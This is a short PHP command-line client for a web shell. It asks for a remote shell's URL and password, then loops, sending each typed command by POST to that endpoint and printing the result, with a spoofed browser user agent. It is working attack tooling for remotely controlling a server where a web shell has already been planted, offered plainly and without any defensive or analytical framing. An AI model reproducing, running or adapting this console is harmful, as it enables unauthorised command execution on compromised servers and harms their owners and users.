<?php
echo "URL Remoteshell: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $url = trim($input);
fclose($inputs);

print "Password: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $password = trim(md5($input));
    $connect = remoteshell_connect($url,$password,"test"); 
    if($connect == "suc_1"){
            print "[*] Connecting to ".$url."\n";
            print "[*] Success connect\n";
            while(1){
                print "\33[1;31mRemoteShell > \33[1;37m";
                $inputs = fopen("php://stdin","r");
                $input = fgets($inputs);
                    $cmd = $input;
                    $connect = remoteshell_connect($url,$password,$cmd); 
                    if($connect){
                        print $connect;
                    }
                fclose($inputs);
            }
    }else{
        print "[*] Failed to connect, incorrect password\n";
    }
fclose($inputs);

function remoteshell_connect($url, $password, $cmd) {
    $content = array("password"=>$password, "cmd"=>$cmd);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}